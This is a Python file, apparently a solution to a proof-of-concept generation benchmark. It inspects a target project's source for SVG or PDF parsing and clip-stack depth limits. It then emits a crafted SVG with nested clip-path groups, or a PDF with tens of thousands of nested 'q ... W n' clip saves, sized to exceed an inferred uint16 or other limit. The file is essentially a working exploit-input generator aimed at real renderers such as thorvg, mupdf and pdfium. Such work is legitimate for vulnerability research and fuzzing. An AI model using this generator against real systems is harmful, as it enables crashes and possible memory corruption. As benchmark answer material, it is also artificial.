import os
import re
import tarfile
from typing import Dict, Iterable, List, Optional, Tuple


def _iter_source_texts(src_path: str,
                       max_file_size: int = 2_000_000,
                       max_total_read: int = 40_000_000) -> Iterable[Tuple[str, str]]:
    read_total = 0
    exts = {
        ".c", ".cc", ".cpp", ".cxx", ".h", ".hpp", ".hh", ".hxx",
        ".m", ".mm", ".rs", ".go", ".java", ".kt", ".swift",
        ".py", ".sh", ".txt", ".md", ".rst", ".in", ".cmake",
        ".mk", ".gn", ".gni", ".bazel", ".bzl", ".cfg", ".yaml", ".yml",
    }

    def want_file(name: str) -> bool:
        base = os.path.basename(name)
        if base.startswith("."):
            return False
        if "fuzz" in base.lower():
            return True
        _, ext = os.path.splitext(base)
        return ext.lower() in exts

    def decode_bytes(b: bytes) -> str:
        try:
            return b.decode("utf-8", "ignore")
        except Exception:
            return b.decode("latin-1", "ignore")

    if os.path.isdir(src_path):
        for root, _, files in os.walk(src_path):
            for fn in files:
                p = os.path.join(root, fn)
                rel = os.path.relpath(p, src_path)
                if not want_file(rel):
                    continue
                try:
                    st = os.stat(p)
                except Exception:
                    continue
                if st.st_size <= 0 or st.st_size > max_file_size:
                    continue
                if read_total + st.st_size > max_total_read:
                    return
                try:
                    with open(p, "rb") as f:
                        data = f.read()
                except Exception:
                    continue
                read_total += len(data)
                yield rel, decode_bytes(data)
        return

    try:
        tf = tarfile.open(src_path, "r:*")
    except Exception:
        return

    with tf:
        for m in tf.getmembers():
            if not m.isfile():
                continue
            if m.size <= 0 or m.size > max_file_size:
                continue
            if not want_file(m.name):
                continue
            if read_total + m.size > max_total_read:
                return
            try:
                f = tf.extractfile(m)
                if f is None:
                    continue
                data = f.read()
            except Exception:
                continue
            read_total += len(data)
            yield m.name, decode_bytes(data)


def _infer_project_name(src_path: str) -> str:
    if os.path.isdir(src_path):
        return os.path.basename(os.path.abspath(src_path)).lower()
    try:
        with tarfile.open(src_path, "r:*") as tf:
            for m in tf.getmembers():
                if not m.name:
                    continue
                top = m.name.split("/", 1)[0]
                if top and top not in (".", ".."):
                    return top.lower()
    except Exception:
        pass
    return os.path.basename(src_path).lower()


def _infer_limit(texts: List[str], hint_uint16: bool, hint_uint8: bool) -> Optional[int]:
    candidates: List[int] = []

    if hint_uint16:
        candidates.append(65535)
    if hint_uint8:
        candidates.append(255)

    patterns = [
        r'(?i)(?:max|limit|kmax)[^0-9]{0,60}(?:nest(?:ing)?|depth)[^0-9]{0,60}(\d{2,6})',
        r'(?i)(?:nest(?:ing)?|depth)[^0-9]{0,60}(?:max|limit|kmax)[^0-9]{0,60}(\d{2,6})',
        r'(?i)(?:clip|layer)[^0-9]{0,60}stack[^0-9\[]*\[([0-9]{2,6})\]',
        r'(?i)(?:stack|depth)[^0-9]{0,60}size[^0-9]{0,20}(\d{2,6})',
        r'(?i)(?:if|while)\s*\([^)]*(?:nest(?:ing)?|depth)[^0-9]{0,20}(?:>=|>|==)\s*([0-9]{2,6})',
    ]

    for t in texts:
        for pat in patterns:
            for m in re.finditer(pat, t):
                try:
                    v = int(m.group(1))
                except Exception:
                    continue
                if 64 <= v <= 200000:
                    candidates.append(v)

    if not candidates:
        return None

    candidates.sort()
    return candidates[-1]


def _gen_svg(n: int) -> bytes:
    if n < 1:
        n = 1
    prefix = (
        b'<svg width="1" height="1" xmlns="http://www.w3.org/2000/svg">'
        b'<defs><clipPath id="a"><rect/></clipPath></defs>'
    )
    open_tag = b'<g clip-path="url(#a)">'
    close_tag = b"</g>"
    mid = b"<rect/>"
    suffix = b"</svg>"
    return prefix + (open_tag * n) + mid + (close_tag * n) + suffix


def _gen_pdf(n: int) -> bytes:
    if n < 1:
        n = 1
    # Nested graphics state saves, each with a clip. Restore at end.
    content = (b"q 0 0 1 1 re W n " * n) + (b"Q " * n)

    parts: List[bytes] = []
    offsets: List[int] = [0]  # object 0 is special; keep placeholder
    out = bytearray()

    def add(b: bytes) -> None:
        out.extend(b)

    def add_obj(objnum: int, body: bytes) -> None:
        offsets.append(len(out))
        add(f"{objnum} 0 obj\n".encode("ascii"))
        add(body)
        if not body.endswith(b"\n"):
            add(b"\n")
        add(b"endobj\n")

    add(b"%PDF-1.4\n%\xE2\xE3\xCF\xD3\n")
    add_obj(1, b"<< /Type /Catalog /Pages 2 0 R >>\n")
    add_obj(2, b"<< /Type /Pages /Kids [3 0 R] /Count 1 >>\n")
    add_obj(3, b"<< /Type /Page /Parent 2 0 R /MediaBox [0 0 1 1] /Contents 4 0 R >>\n")

    stream_dict = f"<< /Length {len(content)} >>\n".encode("ascii")
    obj4 = bytearray()
    obj4.extend(stream_dict)
    obj4.extend(b"stream\n")
    obj4.extend(content)
    if not content.endswith(b"\n"):
        obj4.extend(b"\n")
    obj4.extend(b"endstream\n")
    add_obj(4, bytes(obj4))

    startxref = len(out)
    add(b"xref\n")
    add(b"0 5\n")
    add(b"0000000000 65535 f \n")
    for i in range(1, 5):
        off = offsets[i]
        add(f"{off:010d} 00000 n \n".encode("ascii"))
    add(b"trailer\n")
    add(b"<< /Size 5 /Root 1 0 R >>\n")
    add(b"startxref\n")
    add(f"{startxref}\n".encode("ascii"))
    add(b"%%EOF\n")
    return bytes(out)


class Solution:
    def solve(self, src_path: str) -> bytes:
        project = _infer_project_name(src_path)

        svg_score = 0
        pdf_score = 0
        clue_texts: List[str] = []
        hint_uint16 = False
        hint_uint8 = False

        for name, text in _iter_source_texts(src_path):
            lt = text.lower()

            if "uint16_t" in lt and ("nest" in lt or "depth" in lt):
                hint_uint16 = True
            if "uint8_t" in lt and ("nest" in lt or "depth" in lt):
                hint_uint8 = True

            if "llvmfuzzertestoneinput" in lt or "fuzzeddataprovider" in lt or "honggfuzz" in lt:
                if "svg" in lt:
                    svg_score += 6
                if "pdf" in lt:
                    pdf_score += 6

            if "<svg" in lt or "svg" in lt:
                svg_score += 1
            if "clip-path" in lt or "clippath" in lt or "clip path" in lt:
                svg_score += 3
            if "pdf" in lt:
                pdf_score += 1
            if "%pdf" in lt or "startxref" in lt or "xref" in lt:
                pdf_score += 3

            if ("clip" in lt and ("nest" in lt or "depth" in lt)) or ("clip stack" in lt) or ("layer/clip" in lt) or ("clip mark" in lt):
                clue_texts.append(text[:200000])

        if "svg" in project or "thorvg" in project or "lunasvg" in project or "resvg" in project:
            svg_score += 5
        if "pdf" in project or "mupdf" in project or "pdfium" in project:
            pdf_score += 5

        limit = _infer_limit(clue_texts, hint_uint16, hint_uint8)

        # Choose format.
        fmt = "svg" if svg_score >= pdf_score else "pdf"

        # Choose depth. Keep typical payload under ~1MB for SVG; allow PDF a bit larger if needed.
        if limit is None:
            n = 35000 if fmt == "svg" else 45000
        else:
            n = limit + 64

        if fmt == "svg":
            # Try to stay under ~1.2MB for safety, unless inferred limit is very large.
            if n > 80000:
                n = 80000
            # If limit looks like 65535 (wrap/uint16), ensure we at least exceed it within cap.
            if hint_uint16 and n < 65536:
                n = 65536 + 64
                if n > 80000:
                    n = 80000
            return _gen_svg(n)

        # PDF
        if n > 120000:
            n = 120000
        if hint_uint16 and n < 65536:
            n = 65536 + 64
        return _gen_pdf(n)